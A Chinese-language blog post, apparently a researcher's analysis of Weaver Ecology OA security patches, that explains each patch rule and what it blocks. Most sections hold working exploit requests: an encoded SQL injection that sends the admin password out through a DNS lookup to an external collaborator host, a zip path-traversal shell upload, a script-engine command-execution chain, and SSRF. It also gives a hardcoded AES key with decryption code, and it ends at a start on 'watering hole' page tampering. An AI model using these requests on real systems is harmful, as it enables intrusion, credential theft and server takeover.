<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/mobilemode/admin/designer/plugin/getSourceFields HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.6.0</span><br><span class="line">Cookie: ecology_JSessionid=aaaYlT22RJ-pL_enuRwry</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 563</span><br><span class="line"></span><br><span class="line">source=3&amp;sql=115,101,108,101,99,116,32,39,97,39,32,97,115,32,97,32,102,114,111,109,32,115,121,115,46,102,110,95,116,114,97,99,101,95,103,101,116,116,97,98,108,101,40,39,92,92,39,43,40,115,101,108,101,99,116,32,112,97,115,115,119,111,114,100,32,102,114,111,109,32,104,114,109,114,101,115,111,117,114,99,101,109,97,110,97,103,101,114,32,119,104,101,114,101,32,105,100,61,49,41,43,39,46,106,117,104,56,100,50,57,108,110,53,120,49,113,49,103,106,57,54,104,111,122,114,106,120,48,111,54,102,117,97,105,122,46,111,97,115,116,105,102,121,46,99,111,109,92,49,46,116,114,99,39,44,100,101,102,97,117,108,116,41,41,32,114,49,32,117,110,105,111,110,32,97,108,108,32,115,101,108,101,99,116,32,42,32,32,102,114,111,109,40,115,101,108,101,99,116,32,39,98,39,32,97,115,32,98</span><br></pre></td></tr></table></figure>

<h3 id="Ecology-security-20220726-v10-49"><a href="#Ecology-security-20220726-v10-49" class="headerlink" title="Ecology_security_20220726_v10.49"></a>Ecology_security_20220726_v10.49</h3><h4 id="SecurityRuleInitMobileConfig"><a href="#SecurityRuleInitMobileConfig" class="headerlink" title="SecurityRuleInitMobileConfig"></a>SecurityRuleInitMobileConfig</h4><p>修复任意用户登录</p>
<h4 id="SercurityRuleForWfImport"><a href="#SercurityRuleForWfImport" class="headerlink" title="SercurityRuleForWfImport"></a>SercurityRuleForWfImport</h4><p>拦截<code>/api/workflow/workflowImport/getImportType</code><br>修了个导入后缀问题禁掉了<code>.jsp</code>等<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215703744.png"></p>
<h3 id="Ecology-security-20220728-v10-50"><a href="#Ecology-security-20220728-v10-50" class="headerlink" title="Ecology_security_20220728_v10.50"></a>Ecology_security_20220728_v10.50</h3><h4 id="SecurityRuleForEcLocaleSQL"><a href="#SecurityRuleForEcLocaleSQL" class="headerlink" title="SecurityRuleForEcLocaleSQL"></a>SecurityRuleForEcLocaleSQL</h4><p>拦截<code>/api/ec/dev/locale/getLabelByModule</code><br>似乎是个注入 检测<code>%</code>、<code>&#39;</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215704703.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215705048.png"></p>
<h3 id="Ecology-security-20220731-v10-52"><a href="#Ecology-security-20220731-v10-52" class="headerlink" title="Ecology_security_20220731_v10.52"></a>Ecology_security_20220731_v10.52</h3><h4 id="SercurityRuleForHrmImportListImp"><a href="#SercurityRuleForHrmImportListImp" class="headerlink" title="SercurityRuleForHrmImportListImp"></a>SercurityRuleForHrmImportListImp</h4><p>对<code>/api/hrm/batchResourcePhoto/savePhotoImport</code>路径进行加黑，为文件释放，如泛微为新装，则在<code>Ecology9.00.2204.01</code>版本补丁包<code>10.44</code>修复，该修改不在官方补丁中呈现<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215705369.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215705698.png"><br>测试后为压缩包路径穿越，解压后路径为<code>hrm\import\log\photo\x.jsp</code>，压缩包可跨5层路径到根目录<br>上传数据包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/doc/upload/uploadFile HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.6.0</span><br><span class="line">Cookie: ecology_JSessionid=aaaYlT22RJ-pL_enuRwry</span><br><span class="line">Content-Type: multipart/form-data; boundary=X-INSOMNIA-BOUNDARY</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 931</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">--X-INSOMNIA-BOUNDARY</span><br><span class="line">Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;86825dba7134a9cabe5500b5fc487e9b_2.zip&quot;</span><br><span class="line">Content-Type: application/zip</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解压缩数据包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/hrm/batchResourcePhoto/savePhotoImport HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.6.0</span><br><span class="line">Cookie: ecology_JSessionid=aaaYlT22RJ-pL_enuRwry</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 14</span><br><span class="line"></span><br><span class="line">excelfile=1493</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215706557.png"></p>
<h3 id="Ecology-security-20220804-v10-53"><a href="#Ecology-security-20220804-v10-53" class="headerlink" title="Ecology_security_20220804_v10.53"></a>Ecology_security_20220804_v10.53</h3><h4 id="SecurityRuleForDownload"><a href="#SecurityRuleForDownload" class="headerlink" title="SecurityRuleForDownload"></a>SecurityRuleForDownload</h4><p>拦截<code>sessionkey</code>带特殊字符的对<code>/mobile/plugin/download.jsp</code>的请求<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215707914.png"><br>回溯了下是老版本的注入漏洞<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215708273.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215708595.png"></p>
<h4 id="SecurityRuleForMobileApp"><a href="#SecurityRuleForMobileApp" class="headerlink" title="SecurityRuleForMobileApp"></a>SecurityRuleForMobileApp</h4><h5 id="x2F-api-x2F-workflow-x2F-reqform-x2F-getHtmlToPdf"><a href="#x2F-api-x2F-workflow-x2F-reqform-x2F-getHtmlToPdf" class="headerlink" title="&#x2F;api&#x2F;workflow&#x2F;reqform&#x2F;getHtmlToPdf"></a>&#x2F;api&#x2F;workflow&#x2F;reqform&#x2F;getHtmlToPdf</h5><p>拦截<code>/api/workflow/reqform/getHtmlToPdf</code>的参数带<code>%</code>、<code>~</code>、<code>:</code>特殊字符的请求，数据包构造不出来，利用的话系统中需要有至少一个流程，描述为命令注入，留坑<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215709445.png"></p>
<h5 id="x2F-login-x2F-Loginoperation-jsp"><a href="#x2F-login-x2F-Loginoperation-jsp" class="headerlink" title="&#x2F;login&#x2F;Loginoperation.jsp"></a>&#x2F;login&#x2F;Loginoperation.jsp</h5><p>检测<code>loginid</code>中带特殊字符，存在就拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215710858.png"></p>
<h4 id="SercurityRuleForWfImportInfo"><a href="#SercurityRuleForWfImportInfo" class="headerlink" title="SercurityRuleForWfImportInfo"></a>SercurityRuleForWfImportInfo</h4><h5 id="x2F-api-x2F-workflow-x2F-workflowImport-x2F-getImportInfo"><a href="#x2F-api-x2F-workflow-x2F-workflowImport-x2F-getImportInfo" class="headerlink" title="&#x2F;api&#x2F;workflow&#x2F;workflowImport&#x2F;getImportInfo"></a>&#x2F;api&#x2F;workflow&#x2F;workflowImport&#x2F;getImportInfo</h5><p>一处文件导入 低版本或可getshell，导入流程会阻塞当前线程</p>
<h5 id="x2F-api-x2F-workflow-x2F-wfexceldesign-x2F-excelImport"><a href="#x2F-api-x2F-workflow-x2F-wfexceldesign-x2F-excelImport" class="headerlink" title="&#x2F;api&#x2F;workflow&#x2F;wfexceldesign&#x2F;excelImport"></a>&#x2F;api&#x2F;workflow&#x2F;wfexceldesign&#x2F;excelImport</h5><p>一处文件导入 低版本或可getshell<br>新版有校验</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/workflow/wfexceldesign/excelImport?oprateType=import&amp;fileid=1496 HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.6.0</span><br><span class="line">Cookie: ecology_JSessionid=aaaYlT22RJ-pL_enuRwry</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215711182.png"></p>
<h3 id="Ecology-security-20220815-v10-54"><a href="#Ecology-security-20220815-v10-54" class="headerlink" title="Ecology_security_20220815_v10.54"></a>Ecology_security_20220815_v10.54</h3><h4 id="SecurityRuleGetData"><a href="#SecurityRuleGetData" class="headerlink" title="SecurityRuleGetData"></a>SecurityRuleGetData</h4><p>对每个参数都进行了过滤。。。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215712103.png"></p>
<h4 id="SecurityRuleLoginKey"><a href="#SecurityRuleLoginKey" class="headerlink" title="SecurityRuleLoginKey"></a>SecurityRuleLoginKey</h4><p>修复提权漏洞<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215712420.png"><br>路径<code>/api/hrm/login/qrcode/loginQRCode</code>生成<code>loginkey</code>，在老版本（10.32之前）中该文件可注入，可控制loginkey、loginid<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215712929.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215713296.png"></p>
<h4 id="SecurityRuleUploaderOperate"><a href="#SecurityRuleUploaderOperate" class="headerlink" title="SecurityRuleUploaderOperate"></a>SecurityRuleUploaderOperate</h4><p>规则拦截了<code>uploaderoperate.jsp</code>、<code>/api/portalTsLogin/utils/findAllOfTableName</code></p>
<p><code>/api/portalTsLogin/utils/findAllOfTableName</code>是一处注入，<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215713659.png"><br>但是泛微过滤较严，留个坑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/portalTsLogin/utils/findAllOfTableName?tableName=uf_likes+,+exec+hrmresourcemanager+--+x HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://10.10.10.38</span><br><span class="line">Referer: http://10.10.10.38/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaauKeDbwU8o8fEnuRwry; languageidweaver=7; loginuuids=5; JSESSIONID=aaauKeDbwU8o8fEnuRwry; __randcode__=7c05074f-475f-4e05-9bc2-71c56a0eccb7; loginidweaver=5</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Ecology-security-20221014-v10-55"><a href="#Ecology-security-20221014-v10-55" class="headerlink" title="Ecology_security_20221014_v10.55"></a>Ecology_security_20221014_v10.55</h3><h4 id="SecurityRuleForWeb0927"><a href="#SecurityRuleForWeb0927" class="headerlink" title="SecurityRuleForWeb0927"></a>SecurityRuleForWeb0927</h4><p>拦截<code>integration/dataSourceSetting/datasourcetypeOperation.jsp</code> 多个登录后SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215714107.png"></p>
<h4 id="SecurityRuleSQL1019"><a href="#SecurityRuleSQL1019" class="headerlink" title="SecurityRuleSQL1019"></a>SecurityRuleSQL1019</h4><p>拦截<code>/api/email/base/sendRemindMail</code> 描述为注入，太复杂不跟<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215714358.png"></p>
<h3 id="Ecology-security-20230213-v10-56"><a href="#Ecology-security-20230213-v10-56" class="headerlink" title="Ecology_security_20230213_v10.56"></a>Ecology_security_20230213_v10.56</h3><h4 id="SecurityRuleForGetLog"><a href="#SecurityRuleForGetLog" class="headerlink" title="SecurityRuleForGetLog"></a>SecurityRuleForGetLog</h4><p>拦截<code>/getlog/downlog.jsp</code>的<code>otherIp</code>非网址类型参数，可做SSRF</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215714643.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215714942.png"></p>
<h4 id="SecurityRuleForMobileBrowser"><a href="#SecurityRuleForMobileBrowser" class="headerlink" title="SecurityRuleForMobileBrowser"></a>SecurityRuleForMobileBrowser</h4><p>拦截<code>/mobile/plugin/browser.jsp</code>的<code>keyword</code>带<code>&#39;</code>的请求，SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215715250.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://10.10.10.38/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 2249</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=a%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%30%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%37%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%33%36%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%33%38%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%36%34%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%34%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%37%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%37%25%32%35%25%33%36%25%33%38%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%35%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%33%35%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37</span><br></pre></td></tr></table></figure>


<h4 id="SecurityRuleForScriptEngine"><a href="#SecurityRuleForScriptEngine" class="headerlink" title="SecurityRuleForScriptEngine"></a>SecurityRuleForScriptEngine</h4><p>拦截<code>/api/integration/outter/operateoutterencrypt</code>的<code>operation</code>为<code>test</code>，数据库中<code>encryptclass</code>为<code>cn.hutool.script.JavaScriptEngine</code>的请求</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215715508.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/integration/Outter/operateOutterEncrypt HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://10.10.10.38/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaauMqS--fhcn9ZHDUnzy; __utmc=67879569; __utmz=67879569.1676595719.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); JSESSIONID=aaauMqS--fhcn9ZHDUnzy; loginidweaver=1; languageidweaver=7; loginuuids=1; __utma=67879569.472755009.1676595719.1676788160.1677125383.3; __utmt=1; __utmb=67879569.10.10.1677125383; __randcode__=89c8c4fd-03c8-4b81-b7fb-831eb5c592a4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line"></span><br><span class="line">operation=add&amp;encryptclass=weaver.interfaces.encode.DES_IV&amp;encryptmethod=exec&amp;decryptmethod=1&#x27;,0,&#x27;&#x27;,0,0,&#x27;&#x27;),(&#x27;lib.Config&#x27;,&#x27;ex&#x27;%2b&#x27;ec&#x27;,&#x27;xx&#x27;,&#x27;1&#x27;,0,&#x27;&#x27;,0,0,&#x27;&#x27;),(&#x27;lib.Co2nfig&#x27;,&#x27;exec&#x27;,&#x27;xx&#x27;,&#x27;&amp;encryptname=aa1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/integration/Outter/operateEncryptForm HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://10.10.10.38/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaauMqS--fhcn9ZHDUnzy; __utmc=67879569; __utmz=67879569.1676595719.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); JSESSIONID=aaauMqS--fhcn9ZHDUnzy; loginidweaver=1; languageidweaver=7; loginuuids=1; __utma=67879569.472755009.1676595719.1676788160.1677125383.3; __utmt=1; __utmb=67879569.10.10.1677125383; __randcode__=89c8c4fd-03c8-4b81-b7fb-831eb5c592a4</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 37</span><br><span class="line"></span><br><span class="line">operate=test&amp;plaintext=calc.exe&amp;id=70</span><br></pre></td></tr></table></figure>

<h4 id="SecurityRuleForSpaJs0505"><a href="#SecurityRuleForSpaJs0505" class="headerlink" title="SecurityRuleForSpaJs0505"></a>SecurityRuleForSpaJs0505</h4><p>拦截<code>/api/ec/dev/app/emjoin</code>路径，参数<code>em_url</code>以<code>http</code>开头的请求，为远程JS下载<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215715815.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/ec/dev/app/emjoin HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaHKELYNvmidaOIzy-yy; __utma=67879569.498935329.1676100680.1676100680.1676100680.1; __utmc=67879569; __utmz=67879569.1676100680.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=67879569.1.10.1676100680; loginidweaver=1; loginuuids=1; JSESSIONID=aaaHKELYNvmidaOIzy-yy; languageidweaver=7; __utmd=1; __randcode__=6388ea70-6e63-4091-a190-185b45e63d30</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">&#123;&quot;em_url&quot;:&quot;http://10.10.10.18:8443&quot;&#125;</span><br></pre></td></tr></table></figure>


<h4 id="SecurityRuleForSpaJs2028728"><a href="#SecurityRuleForSpaJs2028728" class="headerlink" title="SecurityRuleForSpaJs2028728"></a>SecurityRuleForSpaJs2028728</h4><p>拦截<code>/api/cpt/baseinfo/fieldLanguagesave</code>请求<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215716073.png"><br>未知<del>，最后落点在<code>weaver/cluster/CacheManagerV8.class:302</code>，似乎是SSRF&#x2F;反序列化？</del><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215716383.png"></p>
<h1 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h1><h2 id="获取补丁号"><a href="#获取补丁号" class="headerlink" title="获取补丁号"></a>获取补丁号</h2><p><code>security/monitor/MonitorStatusForServer.jsp</code><br>返回AES加密数据，密钥<code>WEAVERECOLOGYSECURITY3.0VERSION201607150857</code><br>解密代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] initSecretKey(String code) &#123;</span><br><span class="line">        <span class="type">KeyGenerator</span> <span class="variable">kg</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            kg = KeyGenerator.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            <span class="type">SecureRandom</span> <span class="variable">secureRandom</span> <span class="operator">=</span> SecureRandom.getInstance(<span class="string">&quot;SHA1PRNG&quot;</span>);</span><br><span class="line">            secureRandom.setSeed(code.getBytes());</span><br><span class="line">            kg.init(<span class="number">128</span>, secureRandom);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException var3) &#123;</span><br><span class="line">            var3.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">SecretKey</span> <span class="variable">secretKey</span> <span class="operator">=</span> kg.generateKey();</span><br><span class="line">        <span class="keyword">return</span> secretKey.getEncoded();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">AES2decrypt</span><span class="params">(String sSrc, String sKey)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (sKey == <span class="literal">null</span>) &#123;</span><br><span class="line">                sKey = <span class="string">&quot;WEAVERECOLOGYSECURITY3.0VERSION201607150857&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] raw = initSecretKey(sKey);</span><br><span class="line">            <span class="type">SecretKeySpec</span> <span class="variable">skeySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(raw, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            cipher.init(<span class="number">2</span>, skeySpec);</span><br><span class="line">            <span class="type">byte</span>[] encrypted1 = hex2byte(sSrc);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] original = cipher.doFinal(encrypted1);</span><br><span class="line">                <span class="type">String</span> <span class="variable">originalString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(original);</span><br><span class="line">                <span class="keyword">return</span> originalString;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                var8.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">            var9.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String result=AES2decrypt(<span class="string">&quot;XXXX&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h2 id="水坑"><a href="#水坑" class="headerlink" title="水坑"></a>水坑</h2><h3 id="OA端"><a href="#OA端" class="headerlink" title="OA端"></a>OA端</h3><p><code>/home/weaver/ecology/wui/main.jsp </code>改动的文件</p>
